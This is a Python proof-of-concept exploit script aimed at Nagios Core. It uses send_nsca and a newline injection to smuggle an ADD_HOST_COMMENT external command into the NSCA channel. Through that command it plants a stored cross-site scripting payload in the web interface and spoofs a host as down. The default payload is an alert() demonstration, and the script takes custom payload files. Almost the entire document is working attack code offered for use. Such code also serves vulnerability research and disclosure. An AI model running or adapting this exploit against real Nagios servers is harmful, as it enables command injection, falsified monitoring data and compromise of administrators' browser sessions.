#!/usr/bin/python3

import argparse
import subprocess
import sys
import time

script_description = (
    "Demonstrate XSS via NSCA command injection, targeting Nagios Core"
)

def build_nsca_message(hostname, return_code, output, external_command):
    return f'{hostname}\t{return_code}\t{output}\n{external_command}\n'

def build_external_command(command, hostname, persistent, author, message):
    cur_time = int(time.time())
    return f'[{cur_time}] {command};{hostname};{persistent};{author};{message}'

def build_xss_message(to_display, xss_payload):
    return f'{to_display}</td>{xss_payload}'


def main(target, hostname, config_path, xss_payload):

    display_message = 'xss comment'
    message = build_xss_message(display_message, xss_payload)

    command_type = 'ADD_HOST_COMMENT'
    author = 'nagiosadmin'
    is_persistent = 1
    injected_external_command = build_external_command(command_type, hostname, is_persistent, author, message)

    # NOTE: return_code 0 is up, 1 is down
    # This means we can spoof that the target host (including localhost) is down
    return_code = 1
    nsca_output = 'example output'
    nsca_message = build_nsca_message(hostname, return_code, nsca_output, injected_external_command)
    print(f'[*] NSCA Message with injected payload: "{nsca_message}"')

    send_nsca_path = './send_nsca'
    send_nsca_command = f'{send_nsca_path} -H {target} -c {config_path}'
    print(f'[*] Running command: "{send_nsca_command}"')
    child_process = subprocess.run(
        send_nsca_command.split(),
        input=nsca_message.encode(),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    print(f'[*] Child process return code: {child_process.returncode}')

    if child_process.stdout:
        print(f'    Captured stdout: "{child_process.stdout.decode().strip()}"')
        if child_process.stdout == b'1 data packet(s) sent to host successfully.\n':
            print('[+] Success on message send, check the host page for result')

    if child_process.stderr:
        print(f'    Captured stderr: "{child_process.stderr}"')

        if b'Server closed connection before init packet was received\n' in child_process.stderr and \
           b'Could not read init packet from server\n' in child_process.stderr:
            print('[!] The host may not be allowed to talk to the server or is using the wrong config\n'
                  '    - Check that this host is allowed in the xinetd config\n'
                  '    - Check that the encryption password/method in the config match the server\'s')

        elif b'Error: Could not connect to host' in child_process.stderr or \
             b'Error: Timeout after 10 seconds' in child_process.stderr:
            print('[!] Check the following:\n'
                  '      - the server hostname/IP is correct and the server is up\n'
                  '      - the server firewall to ensure the traffic is allowed\n'
                  '      - the nsca process is running on the server and listening on 5667 (not on localhost only).')




if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        sys.argv[0],
        description=script_description,
    )
    parser.add_argument("target", help="Nagios Server IP or hostname",
                        default="localhost")
    parser.add_argument("--hostname", help="Nagios Client IP or hostname to impersonate",
                        default="localhost")
    parser.add_argument("--config_file", help="NSCA send_nsca.cfg (that matches server)",
                        default="./send_nsca.cfg")
    parser.add_argument("--xss_payload_file", help="Custom XSS payload file (default: alert() payload)")

    args = parser.parse_args()

    # Default demonstration payload (XI's session cookie is httponly)
    xss_payload = '<script>alert("radiant cool eyes hallucinating tragedy among the scholars of war")</script>'
    if args.xss_payload_file:
        with open(args.xss_payload_file) as f:
            xss_payload = f.read()
            xss_payload = ''.join(line.strip() for line in xss_payload.split('\n'))
            print(f'[*] Custom XSS Payload: "{xss_payload}"')

    main(args.target, args.hostname, args.config_file, xss_payload)
